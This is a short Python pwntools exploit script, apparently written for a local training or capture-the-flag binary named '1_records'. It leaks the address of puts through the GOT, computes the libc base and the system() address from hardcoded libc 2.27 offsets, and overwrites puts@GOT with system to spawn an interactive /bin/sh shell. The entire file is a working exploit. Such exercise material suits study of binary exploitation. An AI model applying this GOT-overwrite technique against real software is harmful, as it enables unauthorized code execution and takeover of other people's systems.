#!/usr/bin/python

from pwn import *

# ASLR, PIE, NO CANARY, NX

# getting puts@got from binary
# brenno@skynet /m/b/3/l/l/1/build> readelf -r ./1_records | grep puts
# 0804a018  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0

# getting puts offset from libc
# objdump -d /lib/i386-linux-gnu/libc-2.27.so  | grep "<_IO_puts@@GLIBC_2.0>:"
# 00067ca0 <_IO_puts@@GLIBC_2.0>:

# adding my libc to my local libc database script
# libc-database> ./add libs/libc-2.27.so
# now getting system offset from libc
# libc-database> ./dump local-c6f6bcaa56f45f1670f2ec88e8ef8a008855ea96 | grep system
# offset_system = 0x0003d2e0

def main():
    p = process('../build/1_records')

    # Craft first stage (arbitrary read)
    # Step 1 Read the address of puts in libc (and others, if necessary, to get the right...
    # ... libc version)
    leak_address = 0x0804a018    # Address of puts@got
    command = '/bin/sh'
    stage_1 = command.ljust(24, '\x00') + p32(leak_address)
    p.recvrepeat(0.2)

    # Send the first stage
    p.send(stage_1)

    # Parse the response
    data = p.recvrepeat(0.2)
    leak = data[data.find("(")+1:data.rfind(")")]
    # log.info("Got leaked data: %s" % leak)
    puts_addr = u32(leak[:4])
    log.info("puts@libc: 0x%x" % puts_addr)

    # pid to go to gdb
    # raw_input(str(p.proc.pid))

    # Calculate libc base and system
    # Step 2, using the offsets from the libc version and the leaked puts, calculate the
    # base for libc to get the system call.
    puts_offset = 0x67ca0
    libc_base = puts_addr - puts_offset
    log.info('libc base: 0x%x' % libc_base)
    system_offset = 0x0003d2e0
    system_addr = libc_base + system_offset
    log.info('system@libc: 0x%x' % system_addr)

    # Step3: Overwrite puts@got with system address and profit.
    log.info('Enjoy your shell baby.')
    ret_address = system_addr
    p.send(p32(ret_address))

    p.interactive()

if __name__ == "__main__":
    main()
